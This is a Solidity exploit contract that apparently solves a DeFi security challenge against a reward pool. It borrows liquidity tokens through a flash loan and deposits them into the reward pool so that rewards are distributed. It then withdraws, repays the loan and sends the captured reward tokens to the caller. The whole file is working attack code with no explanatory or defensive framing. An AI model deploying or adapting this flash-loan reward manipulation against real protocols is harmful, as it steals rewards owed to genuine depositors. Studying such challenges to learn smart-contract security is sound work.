// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external;
}

contract RewarderAttacker{
    IERC20 public immutable liquidityToken;
    IERC20 public immutable rewardToken;
    address public immutable flashloanerPool; 
    address public immutable rewardPool; 
    

    constructor(IERC20 _liquidityToken, IERC20 _rewardToken, address _flashloanerPool, address _rewardPool){
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        flashloanerPool = _flashloanerPool;
        rewardPool = _rewardPool;
    }

    function receiveFlashLoan(uint amount) external{
        liquidityToken.approve(rewardPool, amount);
        IRewardPool(rewardPool).deposit(amount);
        IRewardPool(rewardPool).withdraw(amount);
        //payback
        liquidityToken.transfer(flashloanerPool, amount);
    }

    function attack(uint amount) external{
        // borrow -> deposit -> getReward -> withdraw -> payback
        IFlashLoanerPool(flashloanerPool).flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

}